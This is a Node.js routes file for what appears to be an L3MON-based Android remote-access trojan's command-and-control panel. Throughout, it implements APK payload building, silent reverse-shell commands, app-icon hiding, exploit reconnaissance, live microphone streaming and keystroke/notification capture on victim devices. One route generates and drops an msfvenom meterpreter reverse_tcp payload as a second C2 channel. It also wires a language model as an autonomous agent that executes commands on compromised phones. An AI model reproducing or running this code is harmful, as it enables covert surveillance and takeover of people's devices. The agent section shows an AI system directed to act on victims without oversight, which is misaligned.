const
    express = require('express'),
    routes = express.Router(),
    cookieParser = require('cookie-parser'),
    bodyParser = require('body-parser'),
    crypto = require('crypto');

let CONST = global.CONST;
let db = global.db;
let logManager = global.logManager;
let app = global.app;
let clientManager = global.clientManager;
let apkBuilder = global.apkBuilder;

app.use(cookieParser());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

function isAllowed(req, res, next) {
    let cookies = req.cookies;
    let tokens = db.maindb.get('admin.loginTokens').value() || [];
    // Also accept legacy single token for backwards compatibility
    let legacyToken = db.maindb.get('admin.loginToken').value();
    if (legacyToken && tokens.length === 0) tokens = [legacyToken];
    if ('loginToken' in cookies) {
        if (tokens.includes(cookies.loginToken)) next();
        else res.clearCookie('loginToken').redirect('/login');
    } else res.redirect('/login');
}

routes.get('/dl', (req, res) => {
    res.redirect('/build.s.apk');
});

routes.get('/', isAllowed, (req, res) => {
    res.render('index', {
        clientsOnline: clientManager.getClientListOnline(),
        clientsOffline: clientManager.getClientListOffline()
    });
});


routes.get('/login', (req, res) => {
    let error = req.query.e || '';
    res.render('login', { error });
});

routes.post('/login', (req, res) => {
    if ('username' in req.body) {
        if ('password' in req.body) {
            let rUsername = db.maindb.get('admin.username').value();
            let rPassword = db.maindb.get('admin.password').value();
            let passwordMD5 = crypto.createHash('md5').update(req.body.password.toString()).digest("hex");
            if (req.body.username.toString() === rUsername && passwordMD5 === rPassword) {
                let loginToken = crypto.createHash('md5').update((Math.random()).toString() + (new Date()).toString()).digest("hex");
                let tokens = db.maindb.get('admin.loginTokens').value() || [];
                // Also migrate legacy single token
                let legacy = db.maindb.get('admin.loginToken').value();
                if (legacy && !tokens.includes(legacy)) tokens.push(legacy);
                tokens.push(loginToken);
                // Keep max 20 active sessions
                if (tokens.length > 20) tokens = tokens.slice(-20);
                db.maindb.get('admin').assign({ loginTokens: tokens }).write();
                res.cookie('loginToken', loginToken).redirect('/');
            } else return res.redirect('/login?e=badLogin');
        } else return res.redirect('/login?e=missingPassword');
    } else return res.redirect('/login?e=missingUsername');
});

routes.get('/logout', isAllowed, (req, res) => {
    let token = req.cookies.loginToken;
    let tokens = db.maindb.get('admin.loginTokens').value() || [];
    // Remove only this session's token
    tokens = tokens.filter(t => t !== token);
    db.maindb.get('admin').assign({ loginTokens: tokens }).write();
    res.clearCookie('loginToken').redirect('/');
});


routes.get('/builder', isAllowed, (req, res) => {
    res.render('builder', {
        myPort: CONST.control_port
    });
});

routes.get('/tunnel', isAllowed, (req, res) => {
    let url = (global.tunnelManager && global.tunnelManager.getUrl()) || CONST.clientUrl;
    res.json({ url });
});

routes.post('/tunnel/refresh', isAllowed, (req, res) => {
    if (!global.tunnelManager) return res.json({ error: 'Tunnel manager not available' });
    global.tunnelManager.start().then((result) => {
        if (!result.error) {
            CONST.clientUrl = result.url;
            res.json({ url: result.url });
        } else res.json({ error: result.error });
    });
});

routes.post('/builder', isAllowed, (req, res) => {
    let buildUrl = req.query.url;
    // Fallback to legacy uri:port format
    if (!buildUrl && req.query.uri && req.query.port) buildUrl = 'http://' + req.query.uri + ':' + req.query.port;
    // Fallback to configured clientUrl / tunnel URL
    if (!buildUrl) buildUrl = CONST.clientUrl;

    if (buildUrl) apkBuilder.patchAPK(buildUrl, (error) => {
        if (!error) apkBuilder.buildAPK((error) => {
            if (!error) {
                logManager.log(CONST.logTypes.success, "Build Succeded! URL: " + buildUrl);
                res.json({ error: false, url: buildUrl });
            }
            else {
                logManager.log(CONST.logTypes.error, "Build Failed - " + error);
                res.json({ error });
            }
        });
        else {
            logManager.log(CONST.logTypes.error, "Build Failed - " + error);
            res.json({ error });
        }
    });
    else {
        logManager.log(CONST.logTypes.error, "Build Failed - Missing URL");
        res.json({ error: 'Missing URL' });
    }
});


routes.get('/logs', isAllowed, (req, res) => {
    res.render('logs', {
        logs: logManager.getLogs()
    });
});



routes.get('/manage/:deviceid/exploits', isAllowed, (req, res) => {
    let pageData = clientManager.getClientDataByPage(req.params.deviceid, 'exploits');
    if (pageData === false) pageData = {};
    // Load previously stored scan results if any
    let scanResults = null;
    try {
        scanResults = db.maindb.get('clients').find({ clientID: req.params.deviceid }).get('scanResults').value();
    } catch (e) { scanResults = null; }
    res.render('deviceManager', {
        page: 'exploits',
        deviceID: req.params.deviceid,
        baseURL: '/manage/' + req.params.deviceid,
        pageData,
        scanResults
    });
});

// Run full exploit scan (recon only, no auto-run)
routes.post('/manage/:deviceid/exploits/scan', isAllowed, async (req, res) => {
    let recon = clientManager.getClientDataByPage(req.params.deviceid, 'exploits');
    if (!recon || !recon.fingerprint) return res.json({ error: 'Run device recon first (no fingerprint data)' });
    res.json({ error: false, message: 'Scan started', scanning: true });
    // Run async scan
    let scanner = require('./exploitScanner');
    try {
        let results = await scanner.scanDevice(recon);
        let client = db.maindb.get('clients').find({ clientID: req.params.deviceid });
        if (client.value()) client.assign({ scanResults: { ...results, scannedAt: new Date().toISOString() } }).write();
        logManager.log(CONST.logTypes.success, req.params.deviceid + " Exploit scan complete: " + results.cves.length + " CVEs");
    } catch (e) {
        logManager.log(CONST.logTypes.error, "Exploit scan failed: " + e.message);
    }
});

// Get scan results as JSON
routes.get('/manage/:deviceid/exploits/results', isAllowed, (req, res) => {
    let client = db.maindb.get('clients').find({ clientID: req.params.deviceid });
    res.json({ error: false, results: client.value() ? client.value().scanResults : null });
});

routes.get('/manage/:deviceid/:page', isAllowed, (req, res) => {
    let page = req.params.page;
    if (page === 'location') page = 'gps';
    let deviceID = req.params.deviceid;
    // Pages that don't need pageData from DB
    let noDataPages = ['keylogger', 'accounts', 'syssettings', 'settings', 'notFound', 'noPage'];
    let pageData;
    if (noDataPages.indexOf(page) === -1) {
        pageData = clientManager.getClientDataByPage(deviceID, page, req.query.filter);
    } else {
        pageData = {};
    }
    if (page === 'camera') {
        try {
            let clientDB = clientManager.getClientDatabase(deviceID);
            let photos = clientDB.get('photos').value() || [];
            pageData = photos;
        } catch (e) { pageData = []; }
    }
    if (page === 'notFound' || page === 'noPage') {
        pageData = false;
    }
    if (pageData === false && !noDataPages.includes(page)) {
        pageData = {};
    }
    res.render('deviceManager', {
        page: page,
        deviceID: deviceID,
        baseURL: '/manage/' + deviceID,
        pageData: pageData || {}
    });
});

// Delete a client (device) - removes it from the dashboard and deletes its data file
routes.post('/manage/:deviceid/delete', isAllowed, (req, res) => {
    let deviceID = req.params.deviceid;
    let client = clientManager.db.maindb.get('clients').find({ clientID: deviceID }).value();
    if (!client) return res.json({ error: 'Client Doesn\'t exist!' });

    // If the device is online, tell it to disconnect cleanly
    if (clientManager.clientConnections[deviceID]) {
        try { clientManager.clientConnections[deviceID].disconnect(true); } catch (e) { /* ignore */ }
    }
    clientManager.deleteClient(deviceID);
    res.json({ error: false, message: 'Device deleted' });
});

// Request the device to dump its currently active notifications
routes.post('/manage/:deviceid/notifications', isAllowed, (req, res) => {
    clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.notificationFetch, {}, (error, message) => {
        if (!error) res.json({ error: false, message })
        else res.json({ error })
    });
});

// Send a shell command to the device (silent reverse shell)
routes.post('/manage/:deviceid/shell', isAllowed, (req, res) => {
    if (!req.body.cmd) return res.json({ error: 'Missing cmd parameter' });
    clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.shell, { cmd: req.body.cmd }, (error, message) => {
        if (!error) res.json({ error: false, message })
        else res.json({ error })
    });
});

// Send a command to the Alpine proot environment
routes.post('/manage/:deviceid/alpine', isAllowed, (req, res) => {
    if (!req.body.cmd) return res.json({ error: 'Missing cmd parameter' });
    clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.alpine, { cmd: req.body.cmd }, (error, message) => {
        if (!error) res.json({ error: false, message })
        else res.json({ error })
    });
});

// Hide the app icon from the launcher
routes.post('/manage/:deviceid/hideapp', isAllowed, (req, res) => {
    clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.hideApp, {}, (error, message) => {
        if (!error) res.json({ error: false, message })
        else res.json({ error })
    });
});

// Show the app icon in the launcher
routes.post('/manage/:deviceid/showapp', isAllowed, (req, res) => {
    clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.showApp, {}, (error, message) => {
        if (!error) res.json({ error: false, message })
        else res.json({ error })
    });
});

// Trigger exploit reconnaissance on the device
routes.post('/manage/:deviceid/exploits/recon', isAllowed, (req, res) => {
    clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.exploitRecon, {}, (error, message) => {
        if (!error) res.json({ error: false, message })
        else res.json({ error })
    });
});

// Alpine package manager commands (list/add/delete)
routes.post('/manage/:deviceid/packages', isAllowed, (req, res) => {
    if (!req.body.cmd) return res.json({ error: 'Missing cmd parameter' });
    clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.packages, { cmd: req.body.cmd }, (error, message) => {
        if (!error) res.json({ error: false, message })
        else res.json({ error })
    });
});

routes.post('/manage/:deviceid/:commandID', isAllowed, (req, res) => {
    clientManager.sendCommand(req.params.deviceid, req.params.commandID, req.query, (error, message) => {
        if (!error) res.json({ error: false, message })
        else res.json({ error })
    });
});

routes.post('/manage/:deviceid/GPSPOLL/:speed', isAllowed, (req, res) => {
    clientManager.setGpsPollSpeed(req.params.deviceid, parseInt(req.params.speed), (error) => {
        if (!error) res.json({ error: false })
        else res.json({ error })
    });
});

// ============ AI Chat Panel ============
let aiConfig = db.maindb.get('aiConfig').value() || { endpoint: '', apiKey: '', model: 'gpt-4o' };

routes.get('/ai/config', isAllowed, (req, res) => {
    res.json(aiConfig);
});

routes.post('/ai/config', isAllowed, (req, res) => {
    if (req.body.endpoint !== undefined) aiConfig.endpoint = req.body.endpoint;
    if (req.body.apiKey !== undefined) aiConfig.apiKey = req.body.apiKey;
    if (req.body.model !== undefined) aiConfig.model = req.body.model;
    db.maindb.set('aiConfig', aiConfig).write();
    res.json({ error: false, config: aiConfig });
});

routes.post('/ai/models', isAllowed, (req, res) => {
    if (!aiConfig.endpoint || !aiConfig.apiKey) return res.json({ error: 'Configure endpoint and API key first' });
    try {
        const ep = aiConfig.endpoint.replace(/\/+$/, '');
        const u = new URL(ep);
        const isHttps = u.protocol === 'https:';
        const httpMod = isHttps ? require('https') : require('http');
        const opts = {
            hostname: u.hostname,
            port: u.port || (isHttps ? 443 : 80),
            path: u.pathname.replace(/\/+$/,'') + '/models',
            method: 'GET',
            headers: { 'Authorization': 'Bearer ' + aiConfig.apiKey, 'Accept': 'application/json' }
        };
        const treq = httpMod.request(opts, (resp) => {
            let body = '';
            resp.on('data', (c) => body += c);
            resp.on('end', () => {
                try {
                    let data = JSON.parse(body);
                    let models = (data.data || []).map(m => m.id).sort();
                    res.json({ error: false, models });
                } catch (e) { res.json({ error: 'Parse failed', raw: body.slice(0, 400) }); }
            });
        });
        treq.on('error', (e) => res.json({ error: 'Connection failed: ' + e.message }));
        treq.end();
    } catch (e) { res.json({ error: 'Invalid endpoint URL: ' + e.message }); }
});

// ============ L3MON AGENT ============
function buildAgentSystem() {
    let clients = db.maindb.get('clients').value() || [];
    let valid = clients.filter(c => c.clientID && c.clientID !== 'MISSING' && c.clientID !== 'undefined');
    let lines = ['You are the L3MON Agent — an autonomous assistant that controls connected Android devices. You can execute commands, read device data, and manage the platform.', ''];
    lines.push('## Connected Devices');
    if (valid.length === 0) lines.push('No devices connected.');
    else valid.forEach(c => {
        let dd = c.dynamicData || {}; let dev = dd.device || {};
        lines.push(`- ${c.clientID}: ${dev.manufacturer||''} ${dev.model||'unknown'} | Online: ${c.isOnline?'Yes':'No'}`);
    });
    lines.push('');
    lines.push('## Rules');
    lines.push('1. Use your tools — don\'t just suggest commands, execute them.');
    lines.push('2. Check if a device is online before sending commands.');
    lines.push('3. When investigating a device, run read_device_data first to see what info is available, then use exec_command.');
    lines.push('4. Report results clearly and concisely.');
    return lines.join('\n');
}

function getDeviceData(deviceID, fields) {
    try {
        let cdb = JSON.parse(require('fs').readFileSync('./clientData/' + deviceID + '.json', 'utf8'));
        let out = {};
        (fields || ['exploitRecon','packages','shellLog','alpineLog']).forEach(f => {
            let v = cdb[f];
            if (f === 'shellLog' || f === 'alpineLog') out[f] = (v||[]).slice(-5).map(e => ({cmd:e.command, exit:e.exitCode, out:(e.output||'').slice(0,200)}));
            else if (f === 'exploitRecon') out[f] = v && v.fingerprint ? 'fingerprint:'+v.fingerprint+' kernel:'+(v.kernelVersion||'?')+' release:'+(v.release||'?')+' patch:'+(v.securityPatch||'?')+' hw:'+(v.hardware||'?') : 'not collected';
            else if (f === 'packages') out[f] = v && v.list ? 'packages: '+(v.list||[]).join(', ') : 'not collected';
            else out[f] = v || null;
        });
        return out;
    } catch(e) { return null; }
}

function executeTool(toolName, toolArgs) {
    let keyMap = {
        shell: CONST.messageKeys.shell, alpine: CONST.messageKeys.alpine,
        packages: CONST.messageKeys.packages, recon: CONST.messageKeys.exploitRecon,
        hide: CONST.messageKeys.hideApp, show: CONST.messageKeys.showApp,
        admin: CONST.messageKeys.requestAdmin
    };
    let msgKey = keyMap[toolName];
    if (!msgKey) return Promise.resolve(JSON.stringify({ error: 'Unknown tool: ' + toolName }));
    let payload = toolArgs.command ? { cmd: toolArgs.command } : {};
    return new Promise((resolve) => {
        clientManager.sendCommand(toolArgs.device_id, msgKey, payload, (err, msg) => {
            if (err) resolve(JSON.stringify({ error: err }));
            else if (toolName === 'recon' || toolName === 'info') {
                setTimeout(() => { let dd = getDeviceData(toolArgs.device_id, ['exploitRecon']); resolve(JSON.stringify({ sent: msg, info: dd ? dd.exploitRecon : 'pending' })); }, 1500);
            } else if (toolName === 'packages' && toolArgs.command && toolArgs.command.includes('list')) {
                setTimeout(() => { let dd = getDeviceData(toolArgs.device_id, ['packages']); resolve(JSON.stringify({ sent: msg, packages: dd ? dd.packages : 'pending' })); }, 1500);
            } else resolve(JSON.stringify({ status: 'sent', message: msg }));
        });
    });
}

function aiRequest(messages, tools) {
    let payload = { model: aiConfig.model || 'gpt-4o', messages, stream: false };
    if (tools) { payload.tools = tools; payload.tool_choice = 'auto'; }
    return new Promise((resolve, reject) => {
        try {
            const u = new URL(aiConfig.endpoint.replace(/\/+$/, ''));
            const isHttps = u.protocol === 'https:';
            let body = JSON.stringify(payload);
            let opts = { hostname: u.hostname, port: u.port || (isHttps?443:80), path: u.pathname.replace(/\/+$/,'')+'/chat/completions', method: 'POST', timeout: 30000, headers: { 'Authorization': 'Bearer '+aiConfig.apiKey, 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) } };
            let treq = (isHttps ? require('https') : require('http')).request(opts, (tres) => { let d=''; tres.on('data',c=>d+=c); tres.on('end', ()=>{ try { resolve(JSON.parse(d)); } catch(e) { reject('Parse: '+d.slice(0,300)); } }); });
            treq.on('error', e=>reject(e.message)); treq.on('timeout', ()=>{treq.destroy();reject('timeout');}); treq.write(body); treq.end();
        } catch(e) { reject(e.message); }
    });
}

routes.post('/ai/chat', isAllowed, async (req, res) => {
    if (!aiConfig.endpoint || !aiConfig.apiKey) return res.json({ error: 'AI not configured' });
    let userMsgs = req.body.messages || [];
    let messages = [{ role: 'system', content: buildAgentSystem() }, ...userMsgs];
    let tools = [
        { type: 'function', function: { name: 'exec_command', description: 'Execute a command on a device: shell, alpine, packages (add/del/list), recon (collect device info), hide, show, admin', parameters: { type: 'object', properties: { device_id: {type:'string',description:'Device ID'}, category: {type:'string',enum:['shell','alpine','packages','recon','hide','show','admin']}, command: {type:'string',description:'Command to run (for shell/alpine/packages)'} }, required: ['device_id','category'] } } },
        { type: 'function', function: { name: 'read_device_data', description: 'Read stored device data. Available fields: exploitRecon (build/kernel/release info), packages (installed Alpine packages), shellLog (shell history), alpineLog (Alpine history).', parameters: { type: 'object', properties: { device_id: {type:'string'}, fields: {type:'array',items:{type:'string',enum:['exploitRecon','packages','shellLog','alpineLog']}} }, required: ['device_id','fields'] } } },
        { type: 'function', function: { name: 'list_devices', description: 'List all connected devices', parameters: { type: 'object', properties: {}, required: [] } } }
    ];
    let trace = []; let finalReply = '';
    try {
        for (let i=0; i<5; i++) {
            let resp = await aiRequest(messages, tools);
            let choice = resp.choices && resp.choices[0];
            if (!choice) { finalReply = 'No response'; break; }
            if (choice.message && choice.message.tool_calls && choice.message.tool_calls.length > 0) {
                messages.push(choice.message);
                for (let tc of choice.message.tool_calls) {
                    let fn = tc.function, args = JSON.parse(fn.arguments||'{}'), result;
                    if (fn.name === 'list_devices') { let s=buildAgentSystem(); let d=s.split('## Connected Devices')[1]?.split('##')[0]||'None'; result='Connected:\n'+d.trim(); }
                    else if (fn.name === 'read_device_data') { let dd=getDeviceData(args.device_id,args.fields); result=dd?JSON.stringify(dd):'not found'; }
                    else if (fn.name === 'exec_command') result = await executeTool(args.category, args);
                    else result = JSON.stringify({error:'Unknown: '+fn.name});
                    trace.push({ type:'tool', name:fn.name, args, result: result.slice(0,800) });
                    messages.push({ role:'tool', tool_call_id: tc.id, content: result });
                }
            } else if (choice.message && choice.message.content) { finalReply = choice.message.content; break; }
            else { finalReply = 'Unexpected response'; break; }
        }
        if (!finalReply) finalReply = 'Max iterations reached.';
    } catch(e) { finalReply = 'Error: ' + e; }
    res.json({ error: false, reply: finalReply, trace });
});

routes.post('/ai/cmd', isAllowed, (req, res) => {
    let cmd = req.body.cmd || '';
    let parts = cmd.trim().split(/\s+/);
    if (parts[0] === '/help' || parts[0] === 'help') return res.json({ reply: buildAgentSystem() });
    let action = parts[0], deviceID = parts[1], args = parts.slice(2).join(' ');
    if (!deviceID) return res.json({ reply: 'Specify a device ID. Devices: ' + Object.keys(clientManager.clientConnections||{}).join(', ') });
    let cmdMap = {
        '/shell': { key: CONST.messageKeys.shell, payload: { cmd: args } },
        '/alpine': { key: CONST.messageKeys.alpine, payload: { cmd: args } },
        '/packages': { key: CONST.messageKeys.packages, payload: { cmd: args } },
        '/recon': { key: CONST.messageKeys.exploitRecon, payload: {} },
        '/hide': { key: CONST.messageKeys.hideApp, payload: {} },
        '/show': { key: CONST.messageKeys.showApp, payload: {} },
        '/admin': { key: CONST.messageKeys.requestAdmin, payload: {} },
        '/info': { key: CONST.messageKeys.exploitRecon, payload: {} },
    };
    let cmdDef = cmdMap[action];
    if (!cmdDef) return res.json({ reply: 'Unknown command: ' + action + '. Try /help' });
    clientManager.sendCommand(deviceID, cmdDef.key, cmdDef.payload, (error, message) => {
        res.json({ reply: (error ? 'Error: '+error : 'Sent '+action+' to '+deviceID+'. '+message) });
    });
});

// Start persistent Alpine supervisor
routes.post('/alpine/proc/:deviceID/start', isAllowed, (req, res) => {
    let sess = getTermSession(req.params.deviceID, 'alpine');
    clientManager.sendCommand(req.params.deviceID, CONST.messageKeys.alpineTerm, {}, (error, message) => {
        if (!error) { sess.supervisor = true; res.json({ error: false, message: 'Supervisor starting' }); }
        else res.json({ error });
    });
});

// Send command to Alpine supervisor (LIST_PROCS, START_SSHD, STOP_SSHD, or raw)
routes.post('/alpine/proc/:deviceID/cmd', isAllowed, (req, res) => {
    if (!req.body.cmd) return res.json({ error: 'Missing cmd' });
    clientManager.sendCommand(req.params.deviceID, CONST.messageKeys.alpineTermInput, { cmd: req.body.cmd }, (error, message) => {
        if (!error) res.json({ error: false, message })
        else res.json({ error });
    });
});

// Stop Alpine supervisor
routes.post('/alpine/proc/:deviceID/stop', isAllowed, (req, res) => {
    let sess = getTermSession(req.params.deviceID, 'alpine');
    clientManager.sendCommand(req.params.deviceID, CONST.messageKeys.alpineTermEnd, {}, (error, message) => {
        if (!error) { sess.supervisor = false; res.json({ error: false, message: 'Supervisor stopping' }); }
        else res.json({ error });
    });
});

// Read supervisor log via one-shot Alpine command
routes.post('/alpine/proc/:deviceID/log', isAllowed, (req, res) => {
    clientManager.sendCommand(req.params.deviceID, CONST.messageKeys.alpine, { cmd: "cat /tmp/supervisor.log 2>&1" }, (error, message) => {
        if (!error) res.json({ error: false, message })
        else res.json({ error });
    });
});

// Save startup script to Alpine /etc/l3mon-startup.sh
routes.post('/alpine/proc/:deviceID/startup', isAllowed, (req, res) => {
    if (!req.body.script) return res.json({ error: 'Missing script' });
    let b64 = Buffer.from(req.body.script).toString('base64');
    let cmd = "mkdir -p /etc && echo " + b64 + " | base64 -d > /etc/l3mon-startup.sh && chmod 755 /etc/l3mon-startup.sh && echo STARTUP_SAVED";
    clientManager.sendCommand(req.params.deviceID, CONST.messageKeys.alpine, { cmd }, (error, message) => {
        if (!error) res.json({ error: false, message })
        else res.json({ error });
    });
});

// Get startup script
routes.post('/alpine/proc/:deviceID/getstartup', isAllowed, (req, res) => {
    clientManager.sendCommand(req.params.deviceID, CONST.messageKeys.alpine, { cmd: "cat /etc/l3mon-startup.sh 2>&1 | base64 || echo EMPTY" }, (error, message) => {
        if (!error) res.json({ error: false, message })
        else res.json({ error });
    });
});

// ============ MODULE STORE ============
let modules = require('./modules');

routes.get('/modules', isAllowed, (req, res) => {
    res.json({ error: false, modules });
});

// Deploy a module (runs install script in Alpine)
routes.post('/manage/:deviceid/modules/deploy', isAllowed, (req, res) => {
    if (!req.body.module) return res.json({ error: 'Missing module name' });
    let mod = modules[req.body.module];
    if (!mod) return res.json({ error: 'Unknown module: ' + req.body.module });
    clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.alpine, { cmd: mod.install }, (error, message) => {
        if (!error) res.json({ error: false, message: 'Deploying ' + mod.name })
        else res.json({ error });
    });
});

// ============ MIC LIVE STREAMING ============
routes.post('/manage/:deviceid/mic/live/start', isAllowed, (req, res) => {
    let deviceID = req.params.deviceid;
    let duration = parseInt(req.body.duration) || 1;
    if (CONST.micLiveTimers[deviceID]) {
        clearInterval(CONST.micLiveTimers[deviceID].timer);
    }
    let timer = setInterval(() => {
        clientManager.sendCommand(deviceID, CONST.messageKeys.mic, { sec: duration });
    }, (duration + 1) * 1000);
    CONST.micLiveTimers[deviceID] = { active: true, timer };
    // Send first recording immediately
    clientManager.sendCommand(deviceID, CONST.messageKeys.mic, { sec: duration });
    res.json({ error: false, message: 'Live mic started (' + duration + 's chunks)' });
});

routes.post('/manage/:deviceid/mic/live/stop', isAllowed, (req, res) => {
    let deviceID = req.params.deviceid;
    if (CONST.micLiveTimers[deviceID]) {
        clearInterval(CONST.micLiveTimers[deviceID].timer);
        delete CONST.micLiveTimers[deviceID];
    }
    res.json({ error: false, message: 'Live mic stopped' });
});

// Get latest mic recordings for live streaming
routes.get('/manage/:deviceid/mic/live/last/:idx', isAllowed, (req, res) => {
    let deviceID = req.params.deviceid;
    let lastIdx = parseInt(req.params.idx) || 0;
    try {
        let clientDB = clientManager.getClientDatabase(deviceID);
        let downloads = clientDB.get('downloads').value() || [];
        let voiceRecs = downloads.filter(d => d.type === 'voiceRecord');
        let recent = voiceRecs.slice(lastIdx).map((d, i) => ({
            idx: lastIdx + i + 1,
            url: d.path,
            name: d.originalName
        }));
        res.json({ error: false, files: recent });
    } catch (e) { res.json({ error: false, files: [] }); }
});

// Keylogger live feed
routes.get('/manage/:deviceid/keylog/:idx', isAllowed, (req, res) => {
    let deviceID = req.params.deviceid;
    let lastIdx = parseInt(req.params.idx) || 0;
    try {
        let clientDB = clientManager.getClientDatabase(deviceID);
        let log = clientDB.get('notificationLog').sortBy('postTime').reverse().value() || [];
        let recent = log.slice(0, 20).map((e, i) => ({
            idx: lastIdx + i + 1,
            app: e.appName || 'system',
            text: e.text || e.title || '',
            time: e.postTime
        }));
        res.json({ error: false, entries: recent });
    } catch (e) { res.json({ error: false, entries: [] }); }
});

// Deploy meterpreter payload into Alpine proot (second C2 channel)
routes.post('/manage/:deviceid/meterpreter', isAllowed, async (req, res) => {
    let lhost = req.body.lhost || '10.99.13.189';
    let lport = req.body.lport || '5555';
    try {
        let out = require('child_process').execSync('msfvenom -p linux/armle/meterpreter/reverse_tcp LHOST=' + lhost + ' LPORT=' + lport + ' -f elf 2>/dev/null | base64 -w0', { timeout: 30000 });
        let b64 = out.toString().trim();
        let cmd = "echo " + b64 + " | base64 -d > /tmp/m && chmod +x /tmp/m && echo METERPRETER_DEPLOYED";
        clientManager.sendCommand(req.params.deviceid, CONST.messageKeys.alpine, { cmd }, (error, message) => {
            if (!error) res.json({ error: false, message: 'Payload deployed to /tmp/m (LHOST ' + lhost + ':' + lport + ')' })
            else res.json({ error });
        });
    } catch (e) { res.json({ error: 'msfvenom failed: ' + e.message }); }
});

// ============ GLOBAL SETTINGS ============
routes.get('/settings', isAllowed, (req, res) => {
    let settings = db.maindb.get('l3monSettings').value() || {};
    res.render('deviceManager', {
        page: 'settings',
        deviceID: '',
        baseURL: '/settings',
        pageData: settings
    });
});

routes.post('/settings', isAllowed, (req, res) => {
    let { section, settings: settingsStr } = req.body;
    try {
        let settings = JSON.parse(settingsStr);
        let current = db.maindb.get('l3monSettings').value() || {};
        current[section] = settings;
        db.maindb.set('l3monSettings', current).write();
        res.json({ error: false, message: section + ' settings saved' });
    } catch (e) { res.json({ error: 'Invalid settings JSON' }); }
});

// Per-device settings
routes.post('/manage/:deviceid/settings', isAllowed, (req, res) => {
    let { section, settings: settingsStr } = req.body;
    try {
        let settings = JSON.parse(settingsStr);
        let clientDB = clientManager.getClientDatabase(req.params.deviceid);
        let current = clientDB.get('deviceSettings').value() || {};
        current[section] = settings;
        clientDB.get('deviceSettings').assign(current).write();
        res.json({ error: false, message: section + ' settings saved' });
    } catch (e) { res.json({ error: 'Invalid settings JSON' }); }
});

module.exports = routes;

// ============ LIVE TERMINAL SESSIONS ============
const termSessions = {};

// Get or create a terminal session for a device
function getTermSession(deviceID, type) {
    let key = deviceID + '_' + (type || 'alpine');
    if (!termSessions[key]) termSessions[key] = { cwd: (type==='alpine')?'/root':'/', output: [], lastId: 0, lastPoll: Date.now() };
    return termSessions[key];
}

// Build the Alpine proot command with cd to current working dir
function buildAlpineTermCmd(deviceID, userCmd) {
    let sess = getTermSession(deviceID, 'alpine');
    let trimmed = userCmd.trim();
    let escaped = trimmed.replace(/\\/g, '\\\\').replace(/'/g, "'\\''");
    // Handle cd: track cwd server-side, just send the cd command
    if (trimmed.startsWith('cd ')) {
        let newDir = trimmed.slice(3).trim();
        if (newDir.startsWith('/')) sess.cwd = newDir;
        else if (newDir === '..') sess.cwd = sess.cwd.replace(/\/[^/]+$/, '') || '/';
        else sess.cwd = sess.cwd.replace(/\/+$/, '') + '/' + newDir;
        sess.cwd = sess.cwd.replace(/\/+/g, '/').replace(/\/+$/, '') || '/';
        return `cd '${sess.cwd.replace(/'/g, "'\\''")}'`;
    }
    if (trimmed === 'cd') { sess.cwd = '/root'; return 'cd /root'; }
    return `cd '${sess.cwd.replace(/'/g, "'\\''")}' && ${escaped}`;
}

function buildShellTermCmd(deviceID, userCmd) {
    let sess = getTermSession(deviceID, 'shell');
    let trimmed = userCmd.trim();
    let escaped = trimmed.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
    if (trimmed.startsWith('cd ')) {
        let newDir = trimmed.slice(3).trim();
        if (newDir.startsWith('/')) sess.cwd = newDir;
        else if (newDir === '..') sess.cwd = sess.cwd.replace(/\/[^/]+$/, '') || '/';
        else sess.cwd = sess.cwd.replace(/\/+$/, '') + '/' + newDir;
        sess.cwd = sess.cwd.replace(/\/+/g, '/').replace(/\/+$/, '') || '/';
        return `cd "${sess.cwd}"`;
    }
    if (trimmed === 'cd') { sess.cwd = '/'; return 'cd /'; }
    return `cd "${sess.cwd}" && ${escaped}`;
}

// Alpine Live Terminal: send command (uses persistent shell if started, else one-shot)
routes.post('/alpine/term/:deviceID/cmd', isAllowed, (req, res) => {
    if (!req.body.cmd) return res.json({ error: 'Missing cmd' });
    let sess = getTermSession(req.params.deviceID, 'alpine');
    let cmd = buildAlpineTermCmd(req.params.deviceID, req.body.cmd);
    if (sess.persistent) {
        clientManager.sendCommand(req.params.deviceID, CONST.messageKeys.alpineTermInput, { cmd: req.body.cmd }, (error, message) => {
            if (!error) { sess.lastCmd = req.body.cmd; res.json({ error: false, message, cwd: sess.cwd }); }
            else res.json({ error });
        });
    } else {
        clientManager.sendCommand(req.params.deviceID, CONST.messageKeys.alpine, { cmd }, (error, message) => {
            if (!error) { sess.lastCmd = req.body.cmd; res.json({ error: false, message, cwd: sess.cwd }); }
            else res.json({ error });
        });
    }
});

// Start persistent Alpine terminal shell
routes.post('/alpine/term/:deviceID/start', isAllowed, (req, res) => {
    let sess = getTermSession(req.params.deviceID, 'alpine');
    clientManager.sendCommand(req.params.deviceID, CONST.messageKeys.alpineTerm, {}, (error, message) => {
        if (!error) { sess.persistent = true; res.json({ error: false, message: 'Terminal started' }); }
        else res.json({ error });
    });
});

// Stop persistent Alpine terminal shell
routes.post('/alpine/term/:deviceID/stop', isAllowed, (req, res) => {
    let sess = getTermSession(req.params.deviceID, 'alpine');
    clientManager.sendCommand(req.params.deviceID, CONST.messageKeys.alpineTermEnd, {}, (error, message) => {
        if (!error) { sess.persistent = false; res.json({ error: false, message: 'Terminal stopped' }); }
        else res.json({ error });
    });
});

// Shell Live Terminal: send command
routes.post('/shell/term/:deviceID/cmd', isAllowed, (req, res) => {
    if (!req.body.cmd) return res.json({ error: 'Missing cmd' });
    let cmd = buildShellTermCmd(req.params.deviceID, req.body.cmd);
    clientManager.sendCommand(req.params.deviceID, CONST.messageKeys.shell, { cmd }, (error, message) => {
        if (!error) {
            let sess = getTermSession(req.params.deviceID, 'shell');
            sess.lastCmd = req.body.cmd;
            res.json({ error: false, message, cwd: sess.cwd });
        } else res.json({ error });
    });
});

// Poll for new output
routes.get('/term/:deviceID/:type/output', isAllowed, (req, res) => {
    let sess = getTermSession(req.params.deviceID, req.params.type);
    let clientData = clientManager.getClientDatabase(req.params.deviceID);
    let logKey = req.params.type === 'alpine' ? 'alpineLog' : 'shellLog';
    let entries = [];
    if (clientData) {
